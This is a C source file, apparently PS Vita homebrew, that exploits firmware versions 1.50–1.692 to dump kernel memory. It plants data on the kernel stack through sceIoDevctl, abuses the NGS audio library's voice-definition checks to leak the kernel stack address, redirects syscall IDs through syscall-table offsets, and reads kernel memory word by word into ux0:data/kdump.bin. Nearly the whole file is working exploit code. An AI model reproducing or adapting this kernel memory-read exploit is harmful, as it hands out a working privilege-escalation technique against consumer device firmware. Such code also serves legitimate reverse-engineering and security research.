#define FW_150
//#define FW_160
//#define FW_1692

#include <fios2.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <stdlib.h>
#include <sceerror.h>
#include <libdbg.h>
#include <kernel.h>
#include <libsysmodule.h>
#include <ngs.h>
#include <apputil.h>
#include <ngs/error.h>

#include <appmgr.h>
#include <kernel/threadmgr.h>
#include <kernel/modulemgr.h>
#include <kernel/iofilemgr.h>

#define SCE_NGS_VOICE_DEFINITION_XOR   0x9e28dcce
#define SCE_NGS_VOICE_DEFINITION_MAGIC 0x66647662
#define SCE_NGS_VOICE_DEFINITION_FLAGS 0x00010001
#define SYSMEMBASE 					   0x480000

#if defined(FW_160) || defined(FW_150)
#define KSTACK_ADDR_START 0x01000B28
#elif defined(FW_1692)
#define KSTACK_ADDR_START 0x01000728
#endif

const uint32_t ADDRESS_START =  0x130d000;	// address to start dumping from..
const uint32_t ADDRESS_END   = 	0x1C00000; 	// address to stop dumping...
const uint32_t BLOCK_SIZE    = 	0x1000; 	// size of data to copy at a time..

#if defined(FW_150)
#define SYSCALLTABLE 			0x10AC000
#endif

unsigned char buffer[0x1000];				// adjust as per BLOCK_SIZE

SceUInt32 sceNgsKernelMemoryRead(void * src, int pos, void * dest);

typedef struct { // size = 0x16 * sizeof(int) = 0x58
	uint32_t sysmem_seg0_addr;
	uint32_t kdump_start_offset;
	uint32_t leaked_sysmem_addr;
	uint32_t leaked_kstack_addr;
	uint32_t leaked_info[0x12];
} kdump_info;

uint32_t kstackaddr = 0x0;
uint32_t leaked_kstack_addr;
uint32_t leaked_sysmem_addr;

uint32_t voiceDef[0x100];
uint32_t paramsize;

SceNgsHSynSystem s_sysHandle;
SceNgsRackDescription rackDesc;

SceInt32 g_syscall_id;
SceInt32 psvSyscallManual(void*,void*,void*,void*);

void set_syscall(int kaddr)
{
	SceInt64 val;
	val = kaddr - SYSCALLTABLE;
	val &= 0xFFFFFFFF;
	val /= 4;
	val +=0x100;
	g_syscall_id=val;
}

void hex_dump(char *str, unsigned char *buf, int size)
{
  int i;

  if(str)
    printf("%s:", str);

  for(i=0; i<size; ++i){
    if((i%16)==0){
      printf("\n%4X:", i);
    }
    printf(" %02X", buf[i]);
  }
  printf("\n\n");
}

// TODO: Port to earlier FW's. Currently only supports 1.500. (0x4ACA08)
bool is_valid_kaddr(unsigned int kaddr, unsigned int ksize, bool write)
{
	set_syscall(0x4ACA08);
	return (!psvSyscallManual((write?(void*)0x3:(void*)0x1), (void*)kaddr, (void*)ksize, 0));
}

int kernel_read_ngs_word(void *dst, void *src) {
	uint32_t kstack_devctl_inbuf_addr = leaked_kstack_addr + 
														#if defined(FW_160) || defined(FW_150)
														0xf20 
														#elif FW_1692
														0xb20
														#endif
														- 0x30;

	// 1) Write data into kernel stack
	uint32_t inbuf[2];
	inbuf[0] = (uint32_t)src - kstack_devctl_inbuf_addr;
	inbuf[1] = 0xFFFFFFFF;
	sceIoDevctl("", 0, inbuf, sizeof(inbuf), NULL, 0);

	// 2) Read kernel
	return sceNgsKernelMemoryRead((void *)kstack_devctl_inbuf_addr, 0, dst);
}
void kernel_read_ngs(void *dst, void *src, uint32_t size) {
	for (uint32_t i = 0; i < size; i += 4)
		printf("%x\n", kernel_read_ngs_word((void*)(dst + i), (void*)(src + i)));
}

void dump_kmem(char* dest, bool verbose)
{
	unsigned char buffer[0x1000];
	memset(buffer, 0x00, 0x1000);
	SceUID fd = sceIoOpen(dest, SCE_O_CREAT | SCE_O_WRONLY | SCE_O_APPEND, 0777);
    for(unsigned int addr = 0x0; addr < 0x3000000; addr+=0x1000)	{
#ifndef FW_1692
		if(is_valid_kaddr(addr, 0x1000, 0))
#endif
		{
			set_syscall(0x4AC9A4); 
			psvSyscallManual(buffer, (void*)addr, (void*)0x1000, 0);
			sceIoWrite(fd, buffer, 0x1000);
		}
#ifndef FW_1692
		else
		{
			memset(buffer, 0x00, 0x1000);
			sceIoWrite(fd, buffer, 0x1000);
		}
#endif
		if(verbose)
			printf("Addr 0x%08X is %s\n", addr, (is_valid_kaddr(addr, 0x1000, 0)?"valid":"invalid"));
	}
	sceIoClose(fd);
}

int init_ngsuser(void) {
	uint32_t ret = 0;
	SceAppUtilInitParam initParam;
	SceAppUtilBootParam bootParam;
	memset( &initParam, 0, sizeof(SceAppUtilInitParam) );
	memset( &bootParam, 0, sizeof(SceAppUtilBootParam) );
	ret = sceAppUtilInit( &initParam, &bootParam );
	printf("sceAppUtilInit() returned 0x%08x\n", ret);
	ret = sceSysmoduleLoadModule(SCE_SYSMODULE_NGS);
	printf("sceSysmoduleLoadModule() returned 0x%08x\n", ret);
	
	SceNgsSystemInitParams initParams;
	initParams.nMaxRacks    = 2;
	initParams.nMaxVoices   = 2;
	initParams.nGranularity = 512;
	initParams.nSampleRate  = 48000;
	initParams.nMaxModules  = 1;
	
	printf("sceNgsSystemGetRequiredMemorySize() returned 0x%x (paramsize: %d)\n", sceNgsSystemGetRequiredMemorySize(&initParams, &paramsize), paramsize);
	static void *s_pSysMem;
	s_pSysMem = memalign(16, paramsize);

	printf("sceNgsSystemInit() returned 0x%x\n", ret = sceNgsSystemInit(s_pSysMem, paramsize, &initParams, &s_sysHandle));
	
	rackDesc.nChannelsPerVoice   = 1;
	rackDesc.nVoices             = 1;
	rackDesc.nMaxPatchesPerInput = 0;
	rackDesc.nPatchesPerOutput   = 0;
	memset(voiceDef, 0, 0x400);
	voiceDef[0] = SCE_NGS_VOICE_DEFINITION_MAGIC;
	voiceDef[1] = SCE_NGS_VOICE_DEFINITION_FLAGS;
	voiceDef[2] = 0x40;
	voiceDef[3] = 0x40;
	
	return ret;
}

int leak_kstack_ngsuser(void) {
	uint32_t ret = 0;
	
	// Write voiceDef to kstack
	sceIoDevctl("", 0, voiceDef, 0x3FF, NULL, 0);
	
	// Find kstack address by searching the voiceBuf in kernel memory
	// for old FWs for example 1.692 
	for (uint32_t addr = KSTACK_ADDR_START; addr < 0x03000000; addr += 0x1000) 
	{
		rackDesc.pVoiceDefn = (struct SceNgsVoiceDefinition*)(addr);
		ret = sceNgsRackGetRequiredMemorySize(s_sysHandle, &rackDesc, &paramsize);
		if (ret == SCE_NGS_ERROR_INVALID_PARAM)
			continue;
		else {
			kstackaddr = addr & 0x00000FFF;
			printf("preset addr: 0x%X\n", kstackaddr);
			return addr& 0xFFFFF000;
		}
	}
	printf("ERROR: Couldn't find kstack addr!\n");
	return 0xFFFFFFFF;
}

int main(void)					
{
	init_ngsuser();
	leaked_kstack_addr = leak_kstack_ngsuser();
	printf("leaked_kstack_addr = 0x%08x\n", leaked_kstack_addr);	
	leaked_sysmem_addr = 0x00480000; // 1.69 static address
	printf("leaked_sysmem_addr = 0x%08x\n", leaked_sysmem_addr);
	sceKernelDelayThread(2000 * 1000);
	sceIoRemove("ux0:data/kdump.bin");
	
	//dump_kmem(buffer, true);

	for (uint32_t block=0; block < ((ADDRESS_END-ADDRESS_START)/BLOCK_SIZE); block += 1) {
		memset(buffer, 0, BLOCK_SIZE);
        for (uint32_t offset=0; offset < BLOCK_SIZE; offset+=4) {
#ifndef FW_1692
			if(is_valid_kaddr((ADDRESS_START+block*BLOCK_SIZE+offset), BLOCK_SIZE, false)) 
#endif
			{
				kernel_read_ngs_word(buffer+offset, (void*)(ADDRESS_START+block*BLOCK_SIZE+offset));
			}
#ifndef FW_1692
			else
			{
				memset(buffer+offset, 0x00, 0x4);
			}
#endif
        }
		SceUID fd = sceIoOpen("ux0:data/kdump.bin", SCE_O_CREAT | SCE_O_WRONLY | SCE_O_APPEND, 0777);
        sceIoWrite(fd, buffer, BLOCK_SIZE);
		sceIoClose(fd);
    }
	
	/*
	// Search SceSysmem entrypoint in kernel
	// Celeste's stuff for cross-compatibility with kdump-extract (https://github.com/CelesteBlue-dev/PSVita-RE-tools/tree/master/kdump-extract)
	// and https://github.com/CelesteBlue-dev/PSVita-RE-tools/tree/master/nids-extract
	const char sysmem_module_entrypoint_magic[] = {0x53, 0x63, 0x65, 0x53, 0x79, 0x73, 0x6D, 0x65, 0x6D, 0x00};
	uint32_t sysmem_seg0_addr = leaked_sysmem_addr;
	
	printf("Bruteforcing SceSysmem seg0 base address\n");
	uint32_t i = 0;
	int exit = 0;
	while (!exit) {
		memset(buffer, 0, BLOCK_SIZE);
		for (uint32_t offset=0; offset < BLOCK_SIZE; offset+=4)
			kernel_read_ngs_word(buffer+offset, (void*)(leaked_sysmem_addr+i*BLOCK_SIZE+offset));
            //printf("%X", );
		for (uint32_t j=0; j < BLOCK_SIZE; ++j) {
			if (!memcmp(buffer+j, sysmem_module_entrypoint_magic, sizeof(sysmem_module_entrypoint_magic))) {
				sysmem_seg0_addr = leaked_sysmem_addr+i*BLOCK_SIZE+j;
				printf("found magic !!!!!\n0x%08X\n", sysmem_seg0_addr);
				exit = 1;
				break;
			}
		}
		//printf("looping... %08X\n", leaked_sysmem_addr+i*BLOCK_SIZE);
		sceKernelDelayThread(500 * 1000);
		++i;
	}
	sysmem_seg0_addr = (sysmem_seg0_addr - 0x2C170) & 0xFFFFF000;
	printf("sysmem_seg0_addr: %08X\n", sysmem_seg0_addr);
	//sceKernelDelayThread(10*1000*1000);

	kdump_info kinfo;
	memset((void *)&kinfo, 0, sizeof(kinfo));
	kinfo.sysmem_seg0_addr = sysmem_seg0_addr;
	kinfo.kdump_start_offset = sizeof(kinfo);
	kinfo.leaked_sysmem_addr = leaked_sysmem_addr;
	kinfo.leaked_kstack_addr = leaked_kstack_addr;
	//memcpy(kinfo.leaked_info, info, sizeof(info));
	SceUID fd = sceIoOpen("ux0:data/kdump.bin", SCE_O_CREAT | SCE_O_WRONLY | SCE_O_APPEND, 0777);
    sceIoWrite(fd, (char *)&kinfo, sizeof(kinfo));
	sceIoClose(fd);
	printf("kernel dump infos buffer written");*/
	
	return 0;
}